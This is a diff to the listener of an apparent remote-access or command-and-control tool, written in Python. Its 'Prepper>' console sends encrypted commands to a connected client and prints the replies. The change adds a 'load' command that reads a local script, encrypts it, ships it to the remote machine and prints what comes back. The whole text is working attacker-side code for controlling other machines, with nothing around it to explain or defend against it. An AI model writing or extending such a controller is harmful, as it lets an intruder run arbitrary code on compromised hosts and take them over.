@@ -35,11 +35,29 @@ def listen(bind_ip,bind_port,password):
             client,addr = server.accept()
             while True:
                 try:
-                    cmd = pervise_api.enctry(input('Prepper> '),password)
+                    cmd = input('Prepper> ')
+                    if 'load' in cmd.lower():
+                        client.send(pervise_api.enctry('load',password).encode())
+                        cmds = cmd.split()
+                        try:
+                            library = cmds[1]
+                            with open(library,'r') as lib:
+                                library = lib.read()
+                            client.send(pervise_api.enctry(library,password).encode())
+                            client.settimeout(240)
+                            print(pervise_api.dectry(client.recv(81962).decode('gbk'),password))
+                            continue
+                        except Exception as e:
+                            color.printRed('[-] Failed.')
+                            color.printRed(str(e))
+                            color.printGreen('Usage: load [FILE PATH]')
+                            color.printGreen('Example: load D:\\\\test.py')
+                            continue
+                    cmd = pervise_api.enctry(cmd,password)
                     client.send(cmd.encode())
                     res = pervise_api.dectry(client.recv(81926).decode('gbk'),password)
                     print(res)
-                    if 'goodbye' in res.lower():
+                    if 'exit' in cmd.lower() or 'goodbye' in res.lower():
                         return 0
                 except Exception as e:
                     color.printRed(str(e))
